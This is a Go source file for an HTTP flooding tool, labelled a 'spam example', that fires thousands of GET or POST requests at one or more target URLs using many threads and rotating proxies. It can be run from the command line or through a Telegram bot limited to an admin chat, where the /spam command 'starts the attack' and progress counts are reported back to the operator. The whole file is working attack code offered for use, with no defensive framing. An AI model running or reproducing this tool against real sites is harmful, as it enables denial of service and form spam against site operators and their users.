/**
	* hope it helps u 							 *
	* By Nikita Vtorushin <n.vtorushin@inbox.ru> *
	* https://t.me/nvtorushin 					 *
	* GoLang spam example OSINT      			 *
**/

package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var completeCount = 0
var errorCount = 0
var botToken = "" // replace u token bot

// admin chat list
var allowedChatIDs = map[int64]bool{
	696300339: true,
}

type any interface{}

func main() {
	if botToken != "" {
		startBot(botToken)
	} else {
		startWithoutBot()
	}
}

func startBot(botToken string) {
	telegramBot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		fmt.Println("Error initializing Telegram Bot:", err)
		return
	} else {
		fmt.Println("initializing Telegram Bot complete")
	}

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates, err := telegramBot.GetUpdatesChan(u)
	if err != nil {
		fmt.Println("Error getting updates channel:", err)
		return
	} else {
		fmt.Println("getting updates channel complete")
	}

	for update := range updates {
		if update.Message != nil && update.Message.IsCommand() {
			if allowedChatIDs[update.Message.Chat.ID] {
				switch update.Message.Command() {
				case "start":
					fmt.Println("get command start", update.Message.Chat)
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Welcome! I'm your HTTP SPAM bot. Use /spam to start the attack. You can provide arguments like /spam -url https://example.com -method GET -data '{\"key\":\"value\"}' -count 100")
					telegramBot.Send(msg)
				case "spam":
					args := strings.Split(update.Message.Text, " ")
					if len(args) < 2 {
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Invalid command. Usage: /spam -url https://example.com -method GET -data '{\"key\":\"value\"}' -count 100")
						telegramBot.Send(msg)
						continue
					}

					args = args[1:]

					fmt.Println("get command start", args)

					go startHTTPSPAM(telegramBot, update.Message.Chat.ID, args)
				}
			} else {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "You are not authorized to use this bot.")
				telegramBot.Send(msg)
			}
		}
	}
}

func startHTTPSPAM(bot *tgbotapi.BotAPI, chatID int64, args []string) {
	sendMessageToTelegram(bot, chatID, "Starting the attack...")

	go func() {
		// parse args
		parseAndRunAttack(bot, args, chatID)

		sendMessageToTelegram(bot, chatID, fmt.Sprintf("Attack complete. Good: %d, Error: %d", completeCount, errorCount))
	}()
}

func parseAndRunAttack(bot *tgbotapi.BotAPI, args []string, chatID int64) {
	if len(args) < 1 {
		sendMessageToTelegram(bot, chatID, "Invalid command. Usage: /spam -url https://example.com -method GET -data '{\"key\":\"value\"}' -count 100")
		return
	}

	args = args[1:]

	attackURL := args[0]
	method := "GET"
	data := ""
	count := 100
	threads := 1
	proxy := ""
	query := ""

	if len(args) > 1 {
		for i := 1; i < len(args); i += 1 {
			switch args[i] {
			case "-method":
				method = args[i+1]
			case "-data":
				data = args[i+1]
			case "-count":
				count, _ = strconv.Atoi(args[i+1])
			case "-threads":
				threads, _ = strconv.Atoi(args[i+1])
			case "-proxy":
				proxy = args[i+1]
			case "-query":
				query = args[i+1]
			}
		}
	}

	proxies := readProxiesFromFile(proxy)
	if proxies == nil {
		proxies = make([]string, 0)
	}

	telegramRunAttacks(bot, attackURL, method, getData(method, data), getData(method, query), readProxiesFromFile(proxy), count, threads, chatID)
}

func telegramRunAttacks(bot *tgbotapi.BotAPI, attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, count int, threads int, chatID int64) {
	var wg sync.WaitGroup
	wg.Add(threads)

	for i := 1; i <= threads; i++ {
		go runAttacksWithTelegram(bot, attackUrl, method, data, queryData, proxies, count, i, &wg, chatID)
	}

	wg.Wait()
}

func runAttacksWithTelegram(bot *tgbotapi.BotAPI, attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, count int, threadIndex int, wg *sync.WaitGroup, chatID int64) {
	defer wg.Done()

	fmt.Println(count)

	for i := 0; i < count; i++ {
		if i%10 == 0 {
			fmt.Println("Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
			sendMessageToTelegram(bot, chatID, fmt.Sprintf("Thread %d - Good: %d, Bad: %d", threadIndex, completeCount, errorCount))
		}
		startAttackWithTelegram(attackUrl, method, data, queryData, proxies, threadIndex)
	}

	sendMessageToTelegram(bot, chatID, fmt.Sprintf("Thread %d - Final - Good: %d, Bad: %d", threadIndex, completeCount, errorCount))
}

func startAttackWithTelegram(attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, threadIndex int) {
	client := &http.Client{}

	if len(proxies) > 0 {
		proxyIndex := (threadIndex - 1) % len(proxies)
		proxy := proxies[proxyIndex]
		if proxy != "" {
			proxyUrl, err := url.Parse(proxy)
			if err == nil {
				client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
			} else {
				fmt.Println("Error parsing proxy URL:", err)
				return
			}
		}
	}

	var resp *http.Response
	var err error

	if method == "POST" || method == "post" {
		if len(queryData) > 0 {
			attackUrl += "?" + queryData.Encode()
		}
		resp, err = client.PostForm(attackUrl, data)
	} else if method == "GET" || method == "get" {
		if len(data) > 0 {
			attackUrl += "?" + data.Encode()
		}
		resp, err = client.Get(attackUrl)
	} else {
		fmt.Println("Invalid method:", method)
		return
	}
	if err != nil {
		fmt.Println("Site not available:", attackUrl, "\nERROR:", err)
		errorCount++
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		req := string(body)
		_ = req

		if err != nil || resp.StatusCode != 200 {
			if err != nil {
				log(err)
			} else {
				log(req)
			}
			errorCount++
		} else {
			completeCount++
		}
	}
}

func sendMessageToTelegram(bot *tgbotapi.BotAPI, chatID int64, message string) {
	msg := tgbotapi.NewMessage(chatID, message)
	bot.Send(msg)
}

func startWithoutBot() {
	attackUrl := flag.String("url", "", "attackUrl spam attack")
	method := flag.String("method", "POST", "method for attack (POST/GET)")
	count := flag.Int("count", 10000, "count for attack")
	data := flag.String("data", ``, "data for attack")
	query := flag.String("query", ``, "query parameters for attack")
	proxyFile := flag.String("proxy", "", "file containing proxies (one per line)")
	threads := flag.Int("threads", 1, "number of threads for attack")
	attackUrlPath := flag.String("urlPath", "", "path to a text document containing URLs for the spam attack")
	flag.Parse()

	var requestData url.Values
	var queryData url.Values

	if *attackUrl != "" || *attackUrlPath != "" {

		if *method == "POST" || *method == "post" {
			if *data != "" {
				requestData = getData(*method, *data)
			}
			if *query != "" {
				queryData = getData("GET", *query)
			}
		} else if (*method == "GET" || *method == "get") && *query != "" {
			requestData = getData(*method, *query)
		}

		var proxies []string
		if *proxyFile != "" {
			proxies = readProxiesFromFile(*proxyFile)
		}

		var urlAttack []string
		if *attackUrlPath != "" {
			source, err := readURLsFromFile(*attackUrlPath)
			if err != nil {
				fmt.Println("Error reading URLs from file:", err)
				return
			} else {
				urlAttack = source
			}
		}

		rand.Seed(time.Now().UnixNano())
		totalRequests := *count

		var wg sync.WaitGroup

		if *attackUrl != "" {
			wg.Add(*threads)
			for i := 1; i <= *threads; i++ {
				go runAttacks(*attackUrl, *method, requestData, queryData, proxies, totalRequests, i, &wg)
			}
		} else {
			wg.Add(len(urlAttack) * *threads)
			for _, attackUrl := range urlAttack {
				if attackUrl != "" {
					for i := 1; i <= *threads; i++ {
						go func(url string, index int) {
							defer wg.Done()
							runAttacks(url, *method, requestData, queryData, proxies, totalRequests, i, &wg)
						}(attackUrl, i)
					}
				}
			}
		}
		wg.Wait()

		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
	} else {
		fmt.Println("Set variable -url or -urlPath")
	}
}

func runAttacks(attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, count int, threadIndex int, wg *sync.WaitGroup) {
	defer wg.Done()

	for i := 0; i < count; i++ {
		if i%5 == 0 {
			fmt.Println("[", attackUrl, "]", "Thread", threadIndex, "Good:", completeCount, "Bad:", errorCount)
		}
		startAttack(attackUrl, method, data, queryData, proxies, threadIndex)
	}
}

func startAttack(attackUrl string, method string, data url.Values, queryData url.Values, proxies []string, threadIndex int) {
	client := &http.Client{}

	if len(proxies) > 0 {
		proxyIndex := (threadIndex - 1) % len(proxies)
		proxy := proxies[proxyIndex]
		if proxy != "" {
			proxyUrl, err := url.Parse(proxy)
			if err == nil {
				client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyUrl)}
			} else {
				fmt.Println("Error parsing proxy URL:", err)
				return
			}
		}
	}

	var resp *http.Response
	var err error

	if method == "POST" || method == "post" {
		if len(queryData) > 0 {
			attackUrl += "?" + queryData.Encode()
		}
		resp, err = client.PostForm(attackUrl, data)
	} else if method == "GET" || method == "get" {
		if len(data) > 0 {
			attackUrl += "?" + data.Encode()
		}
		resp, err = client.Get(attackUrl)
	} else {
		fmt.Println("Invalid method:", method)
		return
	}
	if err != nil {
		fmt.Println("Site not available:", attackUrl, "\nERROR:", err)
		errorCount++
	} else {
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)

		req := string(body)
		_ = req

		if err != nil || resp.StatusCode != 200 {
			if err != nil {
				log(err)
			} else {
				log(req)
			}
			errorCount++
		} else {
			completeCount++
		}
	}
}

func log(data any) {
	fmt.Println(data)
}

func getData(method string, data string) url.Values {
	if data == "" {
		return nil
	}
	if method == "POST" || method == "post" {
		var body = []byte(data)
		return getFormatPostData(body)
	} else if method == "GET" || method == "get" {
		return getFormatGetData(data)
	} else {
		return nil
	}
}

func getFormatGetData(data string) url.Values {
	parsedData, err := url.ParseQuery(data)
	if err != nil {
		fmt.Println("Error parsing query parameters:", err)
		return nil
	}
	return parsedData
}

func getFormatPostData(body []byte) url.Values {
	m := map[string]string{}
	if err := json.Unmarshal(body, &m); err != nil {
		panic(err)
	}
	_body := url.Values{}
	for key, val := range m {
		_body.Add(key, val)
	}

	return _body
}

func readProxiesFromFile(file string) []string {
	var proxies []string
	f, err := os.Open(file)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return proxies
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading proxy file:", err)
	}

	return proxies
}

func readURLsFromFile(filePath string) ([]string, error) {
	var urls []string
	f, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url != "" {
			urls = append(urls, url)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return urls, nil
}
